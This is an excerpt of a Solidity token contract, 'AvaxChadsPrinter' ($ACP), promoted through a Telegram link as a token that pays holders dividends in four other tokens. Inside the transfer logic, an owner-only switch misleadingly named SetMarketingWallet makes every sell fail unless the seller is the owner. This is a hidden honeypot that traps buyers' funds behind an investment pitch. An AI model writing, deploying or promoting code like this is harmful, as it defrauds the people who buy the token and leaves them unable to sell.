...
🖨️https://t.me/avaxchadprinter🖨️


Hold AvaxChadPrinter $ACP and earn 4 differents tokens  split between AvaxChad, Universe, Playmates and Nodec !
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x320a374C9A53Ead66a33F758e98395F999B2f418); 
...
contract AvaxChadsPrinter is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x320a374C9A53Ead66a33F758e98395F999B2f418; 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "AvaxChadsPrinter";
    string constant _symbol = "ACP";
    ...
    address public autoLiquidityReceiver=0xF1a38bCD79501AB8BAf8e33F73Db9e1130b90c92;
    address public marketingFeeReceiver=0xF1a38bCD79501AB8BAf8e33F73Db9e1130b90c92;
    ...
    function SetMarketingWallet(bool value) external onlyOwner {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!MarketingWallet || sender==owner), "");
